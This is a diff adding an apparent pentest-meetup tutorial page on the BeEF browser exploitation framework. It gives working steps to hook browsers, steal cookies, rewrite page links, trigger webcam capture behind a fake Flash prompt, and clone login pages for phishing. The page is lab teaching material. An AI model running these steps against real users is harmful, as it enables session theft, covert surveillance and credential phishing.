+</span><span class="gp">&gt;&gt;&gt; </span><span class="nb">exit</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>And in python3:</p>
+<div class="highlight-python3"><div class="highlight"><pre><span></span><span class="c1"># python3 w/o requests</span>
+<span class="n">python3</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">urllib.parse</span>
+<span class="kn">import</span> <span class="nn">urllib.request</span>
+<span class="n">url_base</span> <span class="o">=</span> <span class="s2">&quot;http://localhost:3000&quot;</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="s2">&quot;beef&quot;</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="s2">&quot;beef&quot;</span><span class="p">})</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">)</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Content-type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">,</span> <span class="s2">&quot;Accept&quot;</span><span class="p">:</span> <span class="s2">&quot;text/json&quot;</span><span class="p">}</span>
+<span class="n">req</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url_base</span> <span class="o">+</span> <span class="s2">&quot;/api/admin/login&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+<span class="n">answer</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">))</span>
+<span class="n">token</span> <span class="o">=</span> <span class="n">answer</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span>
+<span class="c1"># now get hooked browsers</span>
+<span class="n">req</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url_base</span> <span class="o">+</span> <span class="s2">&quot;/api/hooks?&quot;</span> <span class="o">+</span>
+    <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">urlencode</span><span class="p">({</span><span class="s2">&quot;token&quot;</span><span class="p">:</span> <span class="n">token</span><span class="p">}))</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+<span class="n">answer</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">))</span>
+<span class="n">answer</span>
+<span class="n">exit</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-pycon"><div class="highlight"><pre><span></span><span class="go">hacker@kali:~$ # python3 w/o requests</span>
+<span class="go">hacker@kali:~$ python3</span>
+<span class="go">Python 3.2.3 (default, Feb 20 2013, 14:44:27)</span>
+<span class="go">[GCC 4.7.2] on linux2</span>
+<span class="go">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">json</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">urllib.parse</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">urllib.request</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">url_base</span> <span class="o">=</span> <span class="s2">&quot;http://localhost:3000&quot;</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="s2">&quot;beef&quot;</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="s2">&quot;beef&quot;</span><span class="p">})</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Content-type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">,</span> <span class="s2">&quot;Accept&quot;</span><span class="p">:</span> <span class="s2">&quot;text/json&quot;</span><span class="p">}</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">req</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url_base</span> <span class="o">+</span> <span class="s2">&quot;/api/admin/login&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">response</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">answer</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">))</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">token</span> <span class="o">=</span> <span class="n">answer</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="c1"># now get hooked browsers</span>
+<span class="gp">... </span><span class="n">req</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url_base</span> <span class="o">+</span> <span class="s2">&quot;/api/hooks?&quot;</span> <span class="o">+</span>
+<span class="gp">... </span>    <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">urlencode</span><span class="p">({</span><span class="s2">&quot;token&quot;</span><span class="p">:</span> <span class="n">token</span><span class="p">}))</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">response</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">answer</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">))</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">answer</span>
+<span class="hll"><span class="go">{&#39;hooked-browsers&#39;: {&#39;offline&#39;: {&#39;0&#39;: {&#39;domain&#39;: &#39;192.168.1.104&#39;, &#39;version&#39;: &#39;UNKNOWN&#39;, &#39;ip&#39;: &#39;192.168.1.28&#39;, &#39;port&#39;: &#39;3000&#39;, &#39;platform&#39;: &#39;Linux x86_64&#39;, &#39;session&#39;: &#39;VVr7xmQSYAR2ScvA4d7xCxkFnGYc6MMxhmoqoZ9HUdHQ6X4zHLK9HPqI0hTtZ3Mx0FXSoL9cMutn915J&#39;, &#39;page_uri&#39;: &#39;http://192.168.1.104:3000/demos/basic.html&#39;, &#39;os&#39;: &#39;Linux&#39;, &#39;id&#39;: 1, &#39;name&#39;: None}}, &#39;online&#39;: {&#39;0&#39;: {&#39;domain&#39;: &#39;192.168.1.104&#39;, &#39;version&#39;: &#39;UNKNOWN&#39;, &#39;ip&#39;: &#39;192.168.1.28&#39;, &#39;port&#39;: &#39;3000&#39;, &#39;platform&#39;: &#39;Linux x86_64&#39;, &#39;session&#39;: &#39;1kOFWialLh8VOvwmu9DO6EDrw7aXwE0GC77furHwAEGi7u0P96uMXgdfKf5h58sCru4dzRqYjkKx6sgn&#39;, &#39;page_uri&#39;: &#39;http://192.168.1.104:3000/demos/basic.html&#39;, &#39;os&#39;: &#39;Linux&#39;, &#39;id&#39;: 2, &#39;name&#39;: None}}}}</span>
+</span><span class="gp">&gt;&gt;&gt; </span><span class="nb">exit</span><span class="p">()</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="setting-up-beef-in-kali">
+<h2>6.2.2. Setting up BeEF in Kali<a class="headerlink" href="#setting-up-beef-in-kali" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="installation">
+<h3>6.2.2.1. Installation<a class="headerlink" href="#installation" title="Permalink to this headline">¶</a></h3>
+<p>On Kali Linux, the package <code class="docutils literal"><span class="pre">beef-xss</span></code> must be installed and the service <strong class="program">beef-xss</strong> started (to run the beef communication server):</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+<span class="hll"><span class="c1"># install required packages</span>
+</span><span class="hll"><span class="nv">$SUDO</span> apt-get install beef-xss -y
+</span></pre></div>
+</div>
+<p>On non-Kali hosts follow <a class="reference external" href="https://github.com/beefproject/beef/wiki/Installation">BeEF Wiki Installation</a>.</p>
+</div>
+<div class="section" id="beef-configuration">
+<h3>6.2.2.2. BeEF configuration<a class="headerlink" href="#beef-configuration" title="Permalink to this headline">¶</a></h3>
+<p>See <a class="reference external" href="https://github.com/beefproject/beef/wiki/Configuration">BeEF Wiki Configuration</a> for a quick introduction to configuring BeEF. The main BeEF configuration file <code class="file docutils literal"><span class="pre">/etc/beef-xss/config.yaml</span></code> defines the web server port as 3000 with user/password defaults of “beef/beef”. To get a more complete list of BeEF configuration files and search them for particular parameters:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># install apt-file if not already installed</span>
+<span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+<span class="c1"># install required packages</span>
+<span class="nv">$SUDO</span> apt-get install apt-file
+<span class="nv">$SUDO</span> apt-file update
+<span class="hll"><span class="c1"># on Kali 1.0.9a the following lists 217 config.yaml filenames</span>
+</span><span class="hll">apt-file find config.yaml <span class="p">|</span> grep <span class="s1">&#39;beef-xss&#39;</span> <span class="p">|</span> cut -f2 -d:
+</span><span class="hll"><span class="c1"># to search for &quot;port:&quot; in a configuration file</span>
+</span><span class="hll">apt-file find config.yaml <span class="p">|</span> grep <span class="s1">&#39;beef-xss&#39;</span> <span class="p">|</span> cut -f2 -d: <span class="p">|</span> <span class="se">\</span>
+</span><span class="hll">    xargs -n1 grep -iH <span class="s1">&#39;port:&#39;</span>
+</span><span class="hll"><span class="c1"># or save config filenames into a file and use that for grep input</span>
+</span><span class="hll">apt-file find config.yaml <span class="p">|</span> grep <span class="s1">&#39;beef-xss&#39;</span> <span class="p">|</span> cut -f2 -d: &gt; files.txt
+</span><span class="hll">xargs -a files.txt  -n1 grep -iH <span class="s1">&#39;port:&#39;</span>
+</span></pre></div>
+</div>
+<p>Obviously for a real BeEF deployment all default passwords should be changed with a different web server configuration. But for demo/play purposes the defaults (outside the beef/beef userid/password) are OK on a private network.</p>
+</div>
+</div>
+<div class="section" id="running-beef">
+<h2>6.2.3. Running BeEF<a class="headerlink" href="#running-beef" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="starting-the-services">
+<h3>6.2.3.1. Starting the services<a class="headerlink" href="#starting-the-services" title="Permalink to this headline">¶</a></h3>
+<p>Start the <strong class="program">beef-xss</strong> service from the command line. The service runs as the unprivileged user beef-xss and therefore cannot access privileged ports. The Admin GUI then runs at <a class="reference external" href="http://localhost:3000/ui/panel/">http://localhost:3000/ui/panel/</a> and the sample exploit pages run at <a class="reference external" href="http://localhost:3000/demos/basic.html">http://localhost:3000/demos/basic.html</a> and <a class="reference external" href="http://localhost:3000/demos/butcher/index.html">http://localhost:3000/demos/butcher/index.html</a>.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+<span class="c1"># start BeEF communication server prior to exploits</span>
+<span class="c1">#   ss to check server listening ports</span>
+<span class="nv">$SUDO</span> ss -tnlp
+<span class="hll"><span class="nv">$SUDO</span> service beef-xss start
+</span>sleep <span class="m">10</span>
+<span class="nv">$SUDO</span> ss -tnlp
+
+<span class="c1"># when done stop the server</span>
+<span class="hll"><span class="nv">$SUDO</span> service beef-xss stop
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="hook-browsers">
+<h3>6.2.3.2. Hook browsers<a class="headerlink" href="#hook-browsers" title="Permalink to this headline">¶</a></h3>
+<p>The idea is to get the target browser to execute a page containing <strong class="program">hook.js</strong>, which is quite large (here 7039 lines containing 344,428 tighly-packed bytes):</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>curl --silent --remote-name http://localhost:3000/hook.js
+wc hook.js
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> curl --silent --remote-name http://localhost:3000/hook.js
+<span class="gp">hacker@kali:~$</span> wc hook.js
+<span class="hll"><span class="go">7039  25619 344248 hook.js</span>
+</span></pre></div>
+</div>
+<p>There are 2 sample pages where browsers can get hooked: <a class="reference external" href="http://$HOSTIP:3000/demos/basic.html">http://$HOSTIP:3000/demos/basic.html</a> and <a class="reference external" href="http://$HOSTIP:3000/demos/butcher/index.html">http://$HOSTIP:3000/demos/butcher/index.html</a>:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>curl --silent http://localhost:3000/demos/basic.html <span class="p">|</span> grep hook
+curl --silent http://localhost:3000/demos/butcher/index.html <span class="p">|</span> grep hook
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> curl --silent http://localhost:3000/demos/basic.html <span class="p">|</span> grep hook
+<span class="hll"><span class="go">                var commandModuleStr = &#39;&lt;script src=&quot;&#39; + window.location.protocol + &#39;//&#39; + window.location.host + &#39;/hook.js&quot; type=&quot;text/javascript&quot;&gt;&lt;\/script&gt;&#39;;</span>
+</span><span class="hll"><span class="go">        You should be hooked into &lt;b&gt;BeEF&lt;/b&gt;.</span>
+</span><span class="gp">hacker@kali:~$</span> curl --silent http://localhost:3000/demos/butcher/index.html <span class="p">|</span> grep hook
+<span class="hll"><span class="go">        var commandModuleStr = &#39;&lt;script src=&quot;&#39; + window.location.protocol + &#39;//&#39; + window.location.host + &#39;/hook.js&quot; type=&quot;text/javascript&quot;&gt;&lt;\/script&gt;&#39;;</span>
+</span></pre></div>
+</div>
+<p>You can get another meetup participant to browse to your web server or hook your own browser using either <strong class="program">iceweasel</strong>, <strong class="program">chrome</strong>, or any other installed browser with JavaScript enabled.</p>
+</div>
+<div class="section" id="id5">
+<h3>6.2.3.3. Exploiting hooked browsers<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h3>
+<p>The hooked browser will continually poll the BeEF communication server. The BeEF control panel <a class="reference external" href="http://localhost:3000/ui/panel">http://localhost:3000/ui/panel</a> can be used to apply commands from a variety of modules. Let’s assume a remote client was hooked by visiting <a class="reference external" href="http://$HOSTIP:3000/demos/basic.html">http://$HOSTIP:3000/demos/basic.html</a>. Try these basic modules:</p>
+<ul>
+<li><p class="first">In the BeEF control panel browse to the hooked browser under <span class="guilabel">Online Browsers</span> and select <span class="menuselection">Commands ‣ Browser ‣ Hooked Domain ‣ Get Cookie</span>; then under <span class="guilabel">Get Cookie</span> <code class="kbd docutils literal"><span class="pre">click</span></code> <span class="guilabel">Execute</span>; then under <span class="guilabel">Module Results History</span> and <code class="kbd docutils literal"><span class="pre">click</span></code> the last command id. You should see the under <span class="guilabel">Command results</span> the cookies on the hooked browser tab (“BEEFHOOK” in for this web page).</p>
+</li>
+<li><p class="first">Apply command <span class="guilabel">Replace HREFS</span>, which will rewrite the URL’s on the hooked browser’s page to the URL you specify in the <span class="guilabel">Replace HREFS</span> <span class="guilabel">Execute</span> page. Run the command to replace every link on the hooked browser to <a class="reference external" href="https://www.google.com/">https://www.google.com/</a> and verify that the hooked browser links now all actually HREF <a class="reference external" href="https://www.google.com/">https://www.google.com/</a>.</p>
+</li>
+<li><p class="first">For a final test, under <span class="guilabel">Online Browsers</span> select the hooked browser, then select <span class="menuselection">Commands ‣ Browser ‣ Hooked Domain ‣ Webcam</span> <code class="kbd docutils literal"><span class="pre">click</span></code> <span class="guilabel">Execute</span>. Of course the client must have an accessible webcam (which can be checked with the <span class="guilabel">Webcam Permission Check</span> module). The hooked browser should display a message “This website is using Adobe Flash …” with an “Adobe Flash Player Settings” popup requesting <span class="guilabel">Allow</span> access to camera and microphone. After acceptance a series of 20 photos are taken at a 1 second interval (unless you changed the defaults). When the command shows the <span class="guilabel">Ready</span> status (far lower left of window), in <span class="guilabel">Module Results History</span> <code class="kbd docutils literal"><span class="pre">click</span></code> the last command id. You should see the base64 encoded image data displayed in the <span class="guilabel">Webcam</span> panel. The images are large and hard to individually select from the panel. We found it easier to <code class="kbd docutils literal"><span class="pre">right-click</span></code> <code class="kbd docutils literal"><span class="pre">Select</span> <span class="pre">All</span></code> and paste it into an fast editor and save the file as <code class="file docutils literal"><span class="pre">select_all.txt</span></code>. Then get the images by:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">INPUT</span><span class="o">=</span>select_all.txt
+<span class="nv">IMAGE</span><span class="o">=</span>image_
+rm -rf <span class="si">${</span><span class="nv">IMAGE</span><span class="si">}</span><span class="o">[</span><span class="m">0</span>-9<span class="o">][</span><span class="m">0</span>-9<span class="o">]</span>
+sed -ne <span class="s1">&#39;/^data: image=/{s/^data: image=//p}&#39;</span> <span class="nv">$INPUT</span> <span class="p">|</span> <span class="se">\</span>
+  split -d -l <span class="m">1</span> - <span class="nv">$IMAGE</span>
+<span class="k">for</span> i in <span class="si">${</span><span class="nv">IMAGE</span><span class="si">}</span><span class="o">[</span><span class="m">0</span>-9<span class="o">][</span><span class="m">0</span>-9<span class="o">]</span><span class="p">;</span> <span class="k">do</span>
+  base64 -d <span class="nv">$i</span> &gt; <span class="nv">$i</span>.jpg
+<span class="k">done</span>
+rm -rf <span class="si">${</span><span class="nv">IMAGE</span><span class="si">}</span><span class="o">[</span><span class="m">0</span>-9<span class="o">][</span><span class="m">0</span>-9<span class="o">]</span>
+</pre></div>
+</div>
+</li>
+</ul>
+<p>The webcam images are visible as <code class="file docutils literal"><span class="pre">image_[0-9][0-9].jpg</span></code>.</p>
+<p>If the above is too clumsy to do, you can use <strong class="program">sqlite3</strong> on the BeEF database to get the images. Although not recommended, it also gets you familiar with the database behind BeEF. Here we find the images for the hooked browser at 192.168.1.103, which has browser id 6 and only one command with id 17:</p>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="n">sqlite3</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">share</span><span class="o">/</span><span class="n">beef</span><span class="o">-</span><span class="n">xss</span><span class="o">/</span><span class="n">db</span><span class="o">/</span><span class="n">beef</span><span class="p">.</span><span class="n">db</span>
+<span class="p">.</span><span class="n">databases</span>
+<span class="p">.</span><span class="n">tables</span>
+<span class="p">.</span><span class="k">schema</span> <span class="n">core_hookedbrowsers</span>
+<span class="p">.</span><span class="k">schema</span> <span class="n">core_results</span>
+<span class="k">select</span> <span class="n">id</span> <span class="k">from</span> <span class="n">core_hookedbrowsers</span> <span class="k">where</span> <span class="n">ip</span> <span class="o">=</span> <span class="ss">&quot;192.168.1.103&quot;</span><span class="p">;</span>
+<span class="k">select</span> <span class="k">distinct</span> <span class="n">command_id</span> <span class="k">from</span> <span class="n">core_results</span> <span class="k">where</span> <span class="n">hooked_browser_id</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
+<span class="p">.</span><span class="k">output</span> <span class="n">log</span><span class="p">.</span><span class="n">txt</span>
+<span class="k">select</span> <span class="k">data</span> <span class="k">from</span> <span class="n">core_results</span> <span class="k">where</span> <span class="n">hooked_browser_id</span>  <span class="o">=</span> <span class="mi">6</span> <span class="k">and</span> <span class="n">command_id</span> <span class="o">=</span> <span class="mi">17</span><span class="p">;</span>
+</pre></div>
+</div>
+<p>Then process <code class="file docutils literal"><span class="pre">log.txt</span></code> to get the images:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">INPUT</span><span class="o">=</span>log.txt
+<span class="nv">IMAGE</span><span class="o">=</span>image-
+rm -rf <span class="si">${</span><span class="nv">IMAGE</span><span class="si">}</span><span class="o">[</span><span class="m">0</span>-9<span class="o">][</span><span class="m">0</span>-9<span class="o">]</span>
+sed -ne <span class="s1">&#39;/^{&quot;data&quot;:&quot;image=/{s/^{&quot;data&quot;:&quot;image=//;s/&quot;}//;p}&#39;</span> <span class="nv">$INPUT</span> <span class="p">|</span> <span class="se">\</span>
+  split -d -l <span class="m">1</span> - <span class="nv">$IMAGE</span>
+<span class="k">for</span> i in <span class="si">${</span><span class="nv">IMAGE</span><span class="si">}</span><span class="o">[</span><span class="m">0</span>-9<span class="o">][</span><span class="m">0</span>-9<span class="o">]</span><span class="p">;</span> <span class="k">do</span>
+  base64 -d <span class="nv">$i</span> &gt; <span class="nv">$i</span>.jpg
+<span class="k">done</span>
+rm -rf <span class="si">${</span><span class="nv">IMAGE</span><span class="si">}</span><span class="o">[</span><span class="m">0</span>-9<span class="o">][</span><span class="m">0</span>-9<span class="o">]</span>
+</pre></div>
+</div>
+<p>The webcam images are visible as <code class="file docutils literal"><span class="pre">image-[0-9][0-9].jpg</span></code>.</p>
+</div>
+<div class="section" id="more-exploiting-hooked-browsers">
+<h3>6.2.3.4. More exploiting hooked browsers<a class="headerlink" href="#more-exploiting-hooked-browsers" title="Permalink to this headline">¶</a></h3>
+<p>Consult the <a class="reference external" href="https://github.com/beefproject/beef/wiki">BeEF wiki</a> for more examples: <a class="reference external" href="https://github.com/beefproject/beef/wiki/Social-Engineering">BeEF wiki social engineering</a> and <a class="reference external" href="https://github.com/beefproject/beef/wiki/Metasploit">BeEF wiki metasploit</a> are good starts.</p>
+</div>
+<div class="section" id="stopping-the-services">
+<h3>6.2.3.5. Stopping the services<a class="headerlink" href="#stopping-the-services" title="Permalink to this headline">¶</a></h3>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+<span class="c1"># stop BeEF communication server prior to exploits</span>
+<span class="hll"><span class="nv">$SUDO</span> service beef-xss stop
+</span></pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="digitalocean-beef-clone-page-example">
+<h2>6.2.4. DigitalOcean BeEF clone_page example<a class="headerlink" href="#digitalocean-beef-clone-page-example" title="Permalink to this headline">¶</a></h2>
+<p>From <a class="reference external" href="http://blog.beefproject.com/2012/09/beef-web-cloning-beef-mass-mailing.html">BeEF web cloning, BeEF mass mailing, Social Engineering with better BeEF!</a>:</p>
+<blockquote>
+<div><p>Both the web cloner and the mass mailer functionality are currently exposed only via the RESTful API. To clone <a class="reference external" href="https://example.com/login.aspx">https://example.com/login.aspx</a> and mount it on /login.aspx on BeEF, use the following curl request:(update [BeEF]; and [token]; accordingly):</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>curl -H <span class="s2">&quot;Content-Type: application/json; charset=UTF-8&quot;</span> -d
+ <span class="s1">&#39;{&quot;url&quot;:&quot;https://example.com/login.aspx&quot;, &quot;mount&quot;:&quot;/login.aspx&quot;}&#39;</span>
+ -X POST http://<span class="o">[</span>BeEF<span class="o">]</span>/api/seng/clone_page?token<span class="o">=[</span>token<span class="o">]</span><span class="p">;</span>
+</pre></div>
+</div>
+</div></blockquote>
+<p>This example shows how to use the web cloner on a DigitalOcean Debian 8 VM (droplet) running BeEF. The Debian package <strong class="program">authbind</strong> is used to allow BeEF to listen on privileged port 443.</p>
+<div class="section" id="server-setup">
+<h3>6.2.4.1. Server setup<a class="headerlink" href="#server-setup" title="Permalink to this headline">¶</a></h3>
+<p>Assume a DigitalOcean droplet: size 512 MB, Debian 8 x64 image, with <code class="file docutils literal"><span class="pre">~/.ssh/keys/id_do_rsa</span></code> for passwordless access to the droplet (or type in passwords below). First start by connecting as root to the VM:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># set to BeEF server IP and remove any known_hosts of same IP</span>
+<span class="nv">VM</span><span class="o">=</span><span class="m">162</span>.243.153.78
+ssh-keygen -f <span class="s2">&quot;</span><span class="nv">$HOME</span><span class="s2">/.ssh/known_hosts&quot;</span> -R <span class="nv">$VM</span>
+<span class="c1"># will use ssh keys for passwordless access to VM</span>
+ssh-add ~/.ssh/keys/id_do_rsa
+ssh root@<span class="nv">$VM</span>
+</pre></div>
+</div>
+<p>At the BeEF VM as root create &amp; <code class="docutils literal"><span class="pre">su</span></code> to normal user for BeEF setup:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">VM</span><span class="o">=</span><span class="m">162</span>.243.153.78
+<span class="c1"># create a non-root user to &quot;su&quot;</span>
+<span class="nv">RU</span><span class="o">=</span>hacker
+apt-get install sudo -y
+useradd -m <span class="nv">$RU</span>
+passwd <span class="nv">$RU</span>
+<span class="c1"># enter password twice</span>
+usermod -a -G sudo <span class="nv">$RU</span>
+chsh -s /bin/bash <span class="nv">$RU</span>
+<span class="c1"># userdel -r $RU</span>
+
+<span class="c1"># switch to normal user</span>
+<span class="hll">su - <span class="nv">$RU</span>
+</span><span class="hll"><span class="nv">FQDN</span><span class="o">=</span><span class="s2">&quot;pentest-meetup.do.bitbender.org&quot;</span>
+</span><span class="hll"><span class="nv">VM</span><span class="o">=</span><span class="m">162</span>.243.153.78
+</span><span class="hll"><span class="nv">HTTP</span><span class="o">=</span>https
+</span><span class="hll"><span class="nv">RU</span><span class="o">=</span>hacker
+</span><span class="hll"><span class="nv">BEEF_IPP</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$VM</span><span class="s2">&quot;</span>
+</span><span class="hll"><span class="nv">BEEF_USER</span><span class="o">=</span><span class="s2">&quot;lethal&quot;</span>
+</span><span class="hll"><span class="nv">BEEF_PW</span><span class="o">=</span><span class="s2">&quot;beef-test&quot;</span>
+</span>
+<span class="hll"><span class="c1"># BeEF VM setup</span>
+</span><span class="hll"><span class="nv">SUDO</span><span class="o">=</span><span class="s2">&quot;</span><span class="k">$(</span>which sudo<span class="k">)</span><span class="s2">&quot;</span>
+</span><span class="hll"><span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+</span><span class="hll"><span class="nv">$SUDO</span> date
+</span><span class="hll"><span class="nv">$SUDO</span> apt-get update
+</span><span class="hll"><span class="nv">$SUDO</span> apt-get remove rpcbind -y
+</span><span class="hll"><span class="nv">$SUDO</span> apt-get autoremove -y
+</span><span class="hll"><span class="nv">$SUDO</span> apt-get install curl git -y
+</span><span class="hll"><span class="nv">$SUDO</span> apt-get install authbind -y
+</span><span class="hll"><span class="c1"># let $RU access ports 80, 443</span>
+</span><span class="hll"><span class="nv">$SUDO</span> touch /etc/authbind/byport/80
+</span><span class="hll"><span class="nv">$SUDO</span> chgrp <span class="nv">$RU</span> /etc/authbind/byport/80
+</span><span class="hll"><span class="nv">$SUDO</span> chmod <span class="m">770</span> /etc/authbind/byport/80
+</span><span class="hll"><span class="nv">$SUDO</span> touch /etc/authbind/byport/443
+</span><span class="hll"><span class="nv">$SUDO</span> chgrp <span class="nv">$RU</span> /etc/authbind/byport/443
